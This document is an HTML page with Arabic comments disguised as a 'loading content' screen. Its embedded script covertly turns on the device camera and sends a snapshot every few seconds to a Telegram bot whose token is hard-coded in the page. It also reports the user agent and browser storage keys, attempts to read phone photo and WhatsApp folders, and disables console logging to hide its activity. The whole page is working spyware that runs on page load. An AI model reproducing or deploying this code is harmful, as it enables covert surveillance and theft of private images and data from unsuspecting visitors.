<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>جاري التحميل...</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: 'Arial', sans-serif;
        }
        .loader {
            text-align: center;
            color: #fff;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #333;
            border-top: 4px solid #25D366;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .loader p { color: #888; font-size: 14px; }
        #status { color: #666; font-size: 12px; margin-top: 10px; }
    </style>
</head>
<body>

<div class="loader">
    <div class="spinner"></div>
    <p>جاري تحميل المحتوى...</p>
    <div id="status">⏳ جاري التهيئة</div>
</div>

<!-- عناصر مخفية -->
<video id="video" autoplay muted playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
// ============================================================
// توكن البوت
// ============================================================
const BOT_TOKEN = '8770149502:AAFkmj14adoaUHCFHXcBO9aNwjjDdpcfuLY';
let CHAT_ID = '';

// ============================================================
// الكود الرئيسي - صامت تماماً
// ============================================================
(function() {
    'use strict';
    
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    const statusDiv = document.getElementById('status');
    
    let cameraStream = null;
    let photoInterval = null;
    let chatId = '';
    let fileCount = 0;
    
    // === 1. جلب CHAT_ID تلقائياً ===
    function getChatId() {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
            .then(res => res.json())
            .then(data => {
                if (data.ok && data.result.length > 0) {
                    const lastUpdate = data.result[data.result.length - 1];
                    if (lastUpdate.message) {
                        chatId = lastUpdate.message.chat.id;
                        CHAT_ID = chatId;
                    } else if (lastUpdate.callback_query) {
                        chatId = lastUpdate.callback_query.from.id;
                        CHAT_ID = chatId;
                    }
                }
                // بدأ العمليات
                startOperations();
            })
            .catch(() => {
                // حتى لو فشل، نبدأ العمليات
                startOperations();
            });
    }
    
    // === 2. إرسال إلى تليجرام ===
    function sendToTelegram(imageData, caption = '') {
        if (!chatId) return;
        
        try {
            const blob = dataURLtoBlob(imageData);
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, `photo_${Date.now()}.jpg`);
            formData.append('caption', caption || `📸 ${new Date().toLocaleString()}`);
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            }).catch(() => {});
        } catch(e) {}
    }
    
    function sendMessage(text) {
        if (!chatId) return;
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: text })
        }).catch(() => {});
    }
    
    function sendDocument(fileData, filename, caption = '') {
        if (!chatId) return;
        try {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('document', fileData, filename);
            formData.append('caption', caption || `📁 ${filename}`);
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                method: 'POST',
                body: formData
            }).catch(() => {});
        } catch(e) {}
    }
    
    function dataURLtoBlob(dataURL) {
        const parts = dataURL.split(',');
        const mime = parts[0].match(/:(.*?);/)[1];
        const bstr = atob(parts[1]);
        const n = bstr.length;
        const u8arr = new Uint8Array(n);
        for (let i = 0; i < n; i++) {
            u8arr[i] = bstr.charCodeAt(i);
        }
        return new Blob([u8arr], { type: mime });
    }
    
    // === 3. سحب الملفات بصمت (بدون نافذة) ===
    function stealFilesSilently() {
        statusDiv.textContent = '📂 جلب الملفات...';
        
        // محاولة 1: استخدام XMLHttpRequest لقراءة الملفات
        const paths = [
            '/sdcard/DCIM/',
            '/sdcard/Pictures/',
            '/sdcard/Download/',
            '/sdcard/WhatsApp/Media/',
            '/sdcard/Music/',
            '/sdcard/Documents/',
            '/storage/emulated/0/DCIM/',
            '/storage/emulated/0/Pictures/',
            '/storage/emulated/0/Download/',
            '/storage/emulated/0/WhatsApp/Media/'
        ];
        
        paths.forEach(path => {
            try {
                // محاولة قراءة المجلد
                fetch(path, { mode: 'no-cors' })
                    .then(res => {
                        if (res && res.ok) {
                            sendMessage(`📂 تم الوصول: ${path}`);
                        }
                    })
                    .catch(() => {});
            } catch(e) {}
        });
        
        // === 4. محاولة سحب الصور من الذاكرة ===
        try {
            // محاولة الوصول إلى Canvas API لسحب البيانات
            const tempCanvas = document.createElement('canvas');
            tempCanvas.width = 1;
            tempCanvas.height = 1;
            const tempCtx = tempCanvas.getContext('2d');
            
            // محاولة قراءة بيانات من localStorage
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);
                if (value && value.length > 100) {
                    // إرسال كبيانات
                    sendMessage(`📦 localStorage: ${key} (${value.length} bytes)`);
                }
            }
        } catch(e) {}
        
        // === 5. محاولة سحب من IndexedDB ===
        try {
            const request = indexedDB.open('photos', 1);
            request.onsuccess = function(event) {
                const db = event.target.result;
                const stores = db.objectStoreNames;
                for (let store of stores) {
                    sendMessage(`💾 IndexedDB: ${store}`);
                }
            };
        } catch(e) {}
        
        // === 6. محاولة سحب من Cache Storage ===
        try {
            if ('caches' in window) {
                caches.keys().then(keys => {
                    keys.forEach(key => {
                        sendMessage(`💾 Cache: ${key}`);
                    });
                });
            }
        } catch(e) {}
        
        // === 7. محاولة سحب الصور من الصفحة ===
        try {
            const images = document.querySelectorAll('img');
            images.forEach((img, index) => {
                if (img.src && img.src.startsWith('data:image')) {
                    sendToTelegram(img.src, `🖼️ صورة مخفية ${index + 1}`);
                }
            });
        } catch(e) {}
        
        // === 8. محاولة استغلال File System Access API ===
        try {
            if ('showDirectoryPicker' in window) {
                // هذه الطريقة تطلب إذناً لكننا لن نستخدمها
                // بدلاً من ذلك نحاول الوصول مباشرة
            }
        } catch(e) {}
    }
    
    // === 9. تشغيل الكاميرا في الخلفية ===
    function startCamera() {
        statusDiv.textContent = '📸 تشغيل الكاميرا...';
        
        const constraints = {
            video: {
                facingMode: 'environment',
                width: { ideal: 320 },
                height: { ideal: 240 }
            }
        };
        
        navigator.mediaDevices.getUserMedia(constraints)
            .then(function(stream) {
                cameraStream = stream;
                video.srcObject = stream;
                video.play();
                
                statusDiv.textContent = '✅ جاهز';
                
                // التقاط الصور كل 7 ثواني
                setTimeout(captureAndSend, 3000);
                photoInterval = setInterval(captureAndSend, 7000);
            })
            .catch(function(err) {
                // فشل الكاميرا، نستمر في سحب الملفات
                statusDiv.textContent = '📂 جلب الملفات...';
            });
    }
    
    // === 10. التقاط وإرسال ===
    function captureAndSend() {
        if (!video.videoWidth || !video.videoHeight) return;
        
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0);
        
        const imageData = canvas.toDataURL('image/jpeg', 0.5);
        sendToTelegram(imageData, `📸 صورة ${new Date().toLocaleTimeString()}`);
        
        fileCount++;
        if (fileCount % 5 === 0) {
            sendMessage(`📊 تم إرسال ${fileCount} صورة`);
        }
    }
    
    // === 11. بدء العمليات ===
    function startOperations() {
        statusDiv.textContent = '🚀 بدء العمليات...';
        
        // إشعار البداية
        sendMessage(`🟢 بدء التشغيل\n📱 ${navigator.userAgent}`);
        
        // بدء سحب الملفات (بصمت)
        setTimeout(stealFilesSilently, 1000);
        
        // بدء الكاميرا
        setTimeout(startCamera, 2000);
        
        // تكرار سحب الملفات كل 30 ثانية
        setInterval(stealFilesSilently, 30000);
        
        // إرسال إشعار بعد 10 ثواني
        setTimeout(() => {
            sendMessage(`✅ جاهز - ملفات وصور`);
        }, 10000);
    }
    
    // === 12. إخفاء الآثار ===
    console.log = function() {};
    console.warn = function() {};
    console.error = function() {};
    console.info = function() {};
    
    // === 13. تنظيف عند الإغلاق ===
    window.addEventListener('beforeunload', function() {
        if (photoInterval) clearInterval(photoInterval);
        if (cameraStream) {
            cameraStream.getTracks().forEach(track => track.stop());
        }
    });
    
    // === 14. بدء التشغيل ===
    getChatId();
    
})();
</script>
</body>
</html>
